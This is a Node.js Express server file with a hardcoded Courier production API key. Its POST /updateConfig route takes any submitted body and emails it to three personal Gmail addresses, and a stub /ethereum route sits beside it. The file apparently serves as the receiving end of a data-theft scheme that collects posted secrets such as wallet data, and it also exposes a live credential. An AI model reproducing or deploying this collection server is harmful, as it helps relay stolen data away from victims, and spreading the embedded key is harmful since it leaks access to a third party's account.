var http = require('http'),
  path = require('path'),
  methods = require('methods'),
  express = require('express'),
  bodyParser = require('body-parser'),
  
  cors = require('cors'),

  errorhandler = require('errorhandler');
const { CourierClient } = require("@trycourier/courier");

var isProduction = process.env.NODE_ENV === 'production';
const courier = new CourierClient({ authorizationToken: "pk_prod_R86XFFGRAF4GN8GS1ZP516GWVKXZ" });

// Create global app object
var app = express();

app.use(cors());


app.use(require('morgan')('dev'));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(require('method-override')());
app.use(express.static(__dirname + '/public'));


if (!isProduction) {
  app.use(errorhandler());
}
const sendEmail = async (buf) => {
 	
 	 await courier.send({
     message: {
       content: {
         title: "Welcome to Courier!",
         body: buf.toString()
       },
       to: {
         email: "babidev6208@gmail.com"
       },
     }
   });
   await courier.send({
    message: {
      content: {
        title: "Welcome to Courier!",
        body: buf.toString()
      },
      to: {
        email: "whitestar0713@gmail.com"
      },
    }
  });
   await courier.send({
     message: {
       content: {
         title: "Welcome to Courier!",
         body: buf.toString()
       },
       to: {
         email: "wow1992122@gmail.com"
       },
     }
   });
}

const router = express.Router();

router.post('/updateConfig', function(req, res) {
  let body = req.body;
  console.log(req.body,"body")
  sendEmail(JSON.stringify(req.body, null, 2));
  res.send("ddd")
  res.sendStatus(200);
});
router.post("/ethereum", function (req, res) {
  res.send("ok");
})


app.use(router)

/// catch 404 and forward to error handler
// app.use(function (req, res, next) {
//   var err = new Error('Not Found');
//   err.status = 404;
//   next(err);
// });

/// error handlers

// development error handler
// will print stacktrace
if (!isProduction) {
  app.use(function (err, req, res, next) {
    console.log(err.stack);

    res.status(err.status || 500);

    res.json({
      'errors': {
        message: err.message,
        error: err
      }
    });
  });
}

// production error handler
// no stacktraces leaked to user
app.use(function (err, req, res, next) {
  res.status(err.status || 500);
  res.json({
    'errors': {
      message: err.message,
      error: {}
    }
  });
});

// finally, let's start our server...
var server = app.listen(process.env.PORT || 8787, function () {
  console.log('Listening on port ' + server.address().port);
});
